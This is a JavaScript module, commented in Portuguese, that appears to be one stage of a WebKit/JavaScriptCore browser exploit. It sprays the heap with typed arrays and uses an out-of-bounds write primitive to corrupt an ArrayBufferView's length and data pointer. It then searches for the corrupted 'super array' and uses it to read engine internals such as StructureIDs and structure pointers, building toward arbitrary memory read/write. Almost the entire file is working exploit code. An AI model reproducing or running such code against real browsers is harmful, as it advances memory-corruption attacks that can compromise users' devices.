// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs'; //
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs'; //
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs'; //
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; //

// ============================================================
// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO
// ============================================================
const CORRUPTION_OFFSET_TRIGGER = 0x70; //
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); //
const TARGET_WRITE_OFFSET_0x6C = 0x6C; // Afetado pela escrita em 0x70 //
// OOB_SCAN_FILL_PATTERN removido pois não faremos scan pré-corrupção nesta versão focada.

// ============================================================
// VARIÁVEIS GLOBAIS DE MÓDULO
// ============================================================
// Removidas variáveis de executeRetypeOOB_AB_Test se essa função não for mais chamada.
// Se for, elas precisam estar aqui:
// let getter_called_flag = false;
// let global_object_for_internal_stringify;
// let current_test_results_for_subtest;

// ============================================================
// DEFINIÇÃO DA CLASSE CheckpointFor0x6CAnalysis (se executeRetypeOOB_AB_Test for usada)
// ============================================================
// class CheckpointFor0x6CAnalysis { /* ... */ } // Mantenha se executeRetypeOOB_AB_Test for usado

// ============================================================
// FUNÇÃO executeRetypeOOB_AB_Test (se for usada)
// ============================================================
// export async function executeRetypeOOB_AB_Test() { /* ... */ } // Mantenha se for chamada


// ============================================================
// FUNÇÃO DE INVESTIGAÇÃO (v8 - Identificar e usar o array corrompido)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_SPRAY_INVESTIGATE = "sprayAndFindCorrupted_v8"; //
    logS3(`--- Iniciando Investigação (v8): Identificar e Usar Array Corrompido ---`, "test", FNAME_SPRAY_INVESTIGATE); //

    const NUM_SPRAY_OBJECTS = 200; //
    const SPRAY_TYPED_ARRAY_ELEMENT_COUNT = 8; // Pequeno, para pulverizar muitos //
    const FOCUSED_VICTIM_ABVIEW_START_OFFSET = 0x58; // Onde a corrupção de m_length foi observada //

    // Valores para plantar e tentar zerar m_vector do objeto hipotético em 0x58
    const PLANT_MVECTOR_LOW_PART  = 0x00000000; //
    const PLANT_MVECTOR_HIGH_PART = 0x00000000; //

    let sprayedVictimObjects = []; //
    let superArray = null; // Para armazenar a referência ao array corrompido utilizável //

    try {
        await triggerOOB_primitive(); //
        if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) { //
            throw new Error("OOB Init ou primitivas R/W falharam."); //
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_INVESTIGATE); //

        // 1. Heap Spraying
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array(${SPRAY_TYPED_ARRAY_ELEMENT_COUNT})...`, "info", FNAME_SPRAY_INVESTIGATE); //
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            let arr = new Uint32Array(SPRAY_TYPED_ARRAY_ELEMENT_COUNT); //
            arr[0] = (0xFACE0000 | i); // Marcador único em cada array spraiado //
            sprayedVictimObjects.push(arr); //
        }
        logS3("Pulverização de Uint32Array concluída.", "info", FNAME_SPRAY_INVESTIGATE); //
        await PAUSE_S3(200); //

        // 2. Preparar oob_array_buffer_real, Plantar valores para m_vector e 0x6C
        const m_vector_low_addr = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x68 //
        const m_vector_high_addr = m_vector_low_addr + 4; // 0x6C (também TARGET_WRITE_OFFSET_0x6C) //
        
        // Limpar a área alvo antes de plantar (opcional, mas pode evitar interferência de lixo anterior)
        for (let offset_clean = m_vector_low_addr; offset_clean < m_vector_high_addr + 8; offset_clean +=4) {
            try { oob_write_absolute(offset_clean, 0x0, 4); } catch(e){} //
        }

        oob_write_absolute(m_vector_low_addr, PLANT_MVECTOR_LOW_PART, 4); //
        oob_write_absolute(m_vector_high_addr, PLANT_MVECTOR_HIGH_PART, 4);  //
        // A parte alta de 0x6C (que é o início de 0x70) será zerada implicitamente pela escrita acima se PLANT_MVECTOR_HIGH_PART for 0,
        // ou explicitamente zerada antes da corrupção principal.
        oob_write_absolute(TARGET_WRITE_OFFSET_0x6C + 4, 0x0, 4); // Garante que a parte alta de 0x6C seja 0 antes da corrupção. //

        logS3(`Valores plantados ANTES da corrupção trigger:`, "info", FNAME_SPRAY_INVESTIGATE); //
        logS3(`  QWORD @${toHex(m_vector_low_addr)} (m_vector): ${oob_read_absolute(m_vector_low_addr, 8).toString(true)} (Esperado: ${toHex(PLANT_MVECTOR_HIGH_PART,32,false)}_${toHex(PLANT_MVECTOR_LOW_PART,32,false)})`, "info", FNAME_SPRAY_INVESTIGATE); //
        
        // 3. Acionar a Corrupção Principal
        logS3(`Realizando escrita OOB em ${toHex(CORRUPTION_OFFSET_TRIGGER)} (0x70) com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_SPRAY_INVESTIGATE); //
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8); //
        
        // 4. Fase de Pós-Corrupção: Ler metadados e tentar identificar/usar o array
        logS3(`FASE 4: Investigando o offset ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)} APÓS corrupção...`, "info", FNAME_SPRAY_INVESTIGATE); //
        
        // NOVA ADIÇÃO PARA LEITURA DO STRUCTUREID - INÍCIO
        const victimBaseOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET; // 0x58
        const sidOffsetWithinVictim = JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET; // 0x00
        const flagsOffsetWithinVictim = JSC_OFFSETS.ArrayBufferView.FLAGS_OFFSET; // 0x04

        try {
            let potential_sid = oob_read_absolute(victimBaseOffset + sidOffsetWithinVictim, 4);
            logS3(`LEITURA: Valor no offset do StructureID (0x58 + ${toHex(sidOffsetWithinVictim,16)}): ${toHex(potential_sid)}`, 'leak', FNAME_SPRAY_INVESTIGATE);

            let potential_flags = oob_read_absolute(victimBaseOffset + flagsOffsetWithinVictim, 4);
            logS3(`LEITURA: Valor no offset das Flags (0x58 + ${toHex(flagsOffsetWithinVictim,16)}): ${toHex(potential_flags)}`, 'leak', FNAME_SPRAY_INVESTIGATE);

            let potential_struct_ptr = oob_read_absolute(victimBaseOffset + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, 8); // 0x58 + 0x8 = 0x60
            logS3(`LEITURA: Valor no offset do Structure* (0x58 + ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET,16)}): ${potential_struct_ptr.toString(true)}`, 'leak', FNAME_SPRAY_INVESTIGATE);

        } catch (e) {
            logS3(`LEITURA: Erro ao tentar ler StructureID/Flags: ${e.message}`, 'error', FNAME_SPRAY_INVESTIGATE);
        }
        // NOVA ADIÇÃO PARA LEITURA DO STRUCTUREID - FIM

        let abv_vector_after, abv_length_after;
        const vec_offset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;     // 0x68 //
        const len_offset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;     // 0x70 //
        try { abv_vector_after = oob_read_absolute(vec_offset, 8); } catch(e) {}  //
        try { abv_length_after = oob_read_absolute(len_offset, 4); } catch(e) {}  //
            
        logS3(`    m_vector (@${toHex(vec_offset)}): ${isAdvancedInt64Object(abv_vector_after) ? abv_vector_after.toString(true) : "Erro Leitura"}`, "leak", FNAME_SPRAY_INVESTIGATE); //
        logS3(`    m_length (@${toHex(len_offset)}): ${toHex(abv_length_after)} (Decimal: ${abv_length_after})`, "leak", FNAME_SPRAY_INVESTIGATE); //

        if (typeof abv_length_after === 'number' && abv_length_after === 0xFFFFFFFF &&
            isAdvancedInt64Object(abv_vector_after) && abv_vector_after.low() === PLANT_MVECTOR_LOW_PART && abv_vector_after.high() === PLANT_MVECTOR_HIGH_PART) { //
            logS3(`    !!!! SUCESSO NA CORRUPÇÃO DE METADADOS EM ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)} !!!!`, "vuln", FNAME_SPRAY_INVESTIGATE); //
            logS3(`      m_length CORROMPIDO para 0xFFFFFFFF!`, "vuln", FNAME_SPRAY_INVESTIGATE); //
            logS3(`      m_vector CONTROLADO para ${abv_vector_after.toString(true)}!`, "vuln", FNAME_SPRAY_INVESTIGATE); //
            document.title = `Spray: m_vec=${abv_vector_after.toString(true)}, m_len=FFFFFFFF`; //

            // TENTATIVA DE IDENTIFICAR E USAR O Uint32Array CORROMPIDO
            // AVISO: Esta seção é EXPERIMENTAL e pode causar CRASHES.
            // Ela assume que m_vector agora aponta para o início do oob_array_buffer_real.
            if (abv_vector_after.low() === 0 && abv_vector_after.high() === 0) { //
                logS3("    m_vector é ZERO. Tentando identificar qual objeto JS foi corrompido...", "warn", FNAME_SPRAY_INVESTIGATE); //
                
                const MARKER_VALUE_TO_WRITE = 0xDEADBEEF; //
                const MARKER_TEST_OFFSET_IN_OOB_BUFFER = 0x10; // Escrever em oob_array_buffer_real[0x10] //
                const MARKER_TEST_INDEX_IN_U32_ARRAY = MARKER_TEST_OFFSET_IN_OOB_BUFFER / 4; // Índice para Uint32Array //
                
                let original_value_at_marker_offset = 0; //
                try { original_value_at_marker_offset = oob_read_absolute(MARKER_TEST_OFFSET_IN_OOB_BUFFER, 4); } catch(e){} //

                oob_write_absolute(MARKER_TEST_OFFSET_IN_OOB_BUFFER, MARKER_VALUE_TO_WRITE, 4); //
                logS3(`    Marcador ${toHex(MARKER_VALUE_TO_WRITE)} escrito em oob_buffer[${toHex(MARKER_TEST_OFFSET_IN_OOB_BUFFER)}] via oob_write.`, "info", FNAME_SPRAY_INVESTIGATE); //

                for (let i = 0; i < sprayedVictimObjects.length; i++) { //
                    try {
                        // Se este for o array corrompido, sua leitura em MARKER_TEST_INDEX_IN_U32_ARRAY
                        // (que corresponde a MARKER_TEST_OFFSET_IN_OOB_BUFFER se m_vector=0)
                        // deve retornar MARKER_VALUE_TO_WRITE.
                        if (sprayedVictimObjects[i][MARKER_TEST_INDEX_IN_U32_ARRAY] === MARKER_VALUE_TO_WRITE) { //
                            logS3(`      !!!! SUPER ARRAY ENCONTRADO !!!! sprayedVictimObjects[${i}] (marcador inicial: ${toHex(sprayedVictimObjects[i][0])})`, "vuln", FNAME_SPRAY_INVESTIGATE); //
                            logS3(`        Confirmado lendo o marcador ${toHex(MARKER_VALUE_TO_WRITE)} no índice ${MARKER_TEST_INDEX_IN_U32_ARRAY}.`, "vuln", FNAME_SPRAY_INVESTIGATE); //
                            superArray = sprayedVictimObjects[i]; //
                            document.title = `SUPER ARRAY[${i}] VIVO!`; //

                            // Agora podemos tentar ler o StructureID do objeto que suspeitamos estar em FOCUSED_VICTIM_ABVIEW_START_OFFSET
                            // usando nosso superArray (que opera sobre o oob_array_buffer_real)
                            const sid_offset_in_oob = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET; //
                            const sid_index = sid_offset_in_oob / 4;  //
                            if (sid_offset_in_oob % 4 === 0 && sid_index < 0xFFFFFFFF) { // Verifica alinhamento e índice //
                                const actual_sid_at_victim_loc = superArray[sid_index]; //
                                logS3(`        LIDO COM SUPER_ARRAY: StructureID no offset ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)} é ${toHex(actual_sid_at_victim_loc)}`, "leak", FNAME_SPRAY_INVESTIGATE); //
                                // A constante OOB_SCAN_FILL_PATTERN foi removida. Se quiser comparar com um valor não inicializado específico, defina-o.
                                // if (actual_sid_at_victim_loc !== OOB_SCAN_FILL_PATTERN && actual_sid_at_victim_loc !==0 ) { //
                                if (actual_sid_at_victim_loc !==0 ) { 
                                     logS3(`          ESTE É O STRUCTUREID REAL DO OBJETO EM ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)}! Compare com o esperado.`, "good", FNAME_SPRAY_INVESTIGATE); //
                                }
                            }
                            break; 
                        }
                    } catch (e_access) { /* Ignora erros de acesso, a maioria não será o array certo */ } //
                }
                // Restaurar valor original no oob_buffer
                try {oob_write_absolute(MARKER_TEST_OFFSET_IN_OOB_BUFFER, original_value_at_marker_offset, 4); } catch(e){} //

                if (superArray) { //
                    logS3("    Primitiva de Leitura/Escrita Arbitrária (limitada ao oob_buffer) provavelmente alcançada via 'superArray'!", "vuln", FNAME_SPRAY_INVESTIGATE); //
                } else {
                    logS3("    Não foi possível identificar o 'superArray' específico entre os objetos pulverizados nesta tentativa.", "warn", FNAME_SPRAY_INVESTIGATE); //
                }
            } else {
                logS3("    m_vector não é 0. A identificação e uso do array corrompido são mais complexos.", "warn", FNAME_SPRAY_INVESTIGATE); //
            }
        } else {
            // Corrigido para usar FOCUSED_VICTIM_ABVIEW_START_OFFSET em vez de victim_base que não está definido neste escopo.
            logS3(`    Falha em corromper m_length ou controlar m_vector como esperado no offset ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)}.`, "error", FNAME_SPRAY_INVESTIGATE); //
        }
        logS3("INVESTIGAÇÃO DETALHADA COM SPRAY CONCLUÍDA.", "test", FNAME_SPRAY_INVESTIGATE); //

    } catch (e) {
        logS3(`ERRO CRÍTICO na investigação com spray: ${e.message}`, "critical", FNAME_SPRAY_INVESTIGATE); //
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_SPRAY_INVESTIGATE); //
        document.title = "Spray & Investigate FALHOU!"; //
    } finally {
        sprayedVictimObjects = []; //
        clearOOBEnvironment(); //
        logS3("--- Investigação com Spray (v7) Concluída ---", "test", FNAME_SPRAY_INVESTIGATE); //
    }
}

// Manter para referência (não chamada ativamente)
// export async function executeRetypeOOB_AB_Test() { /* ... */ }
// export async function attemptWebKitBaseLeakStrategy_OLD() { /* ... */ }
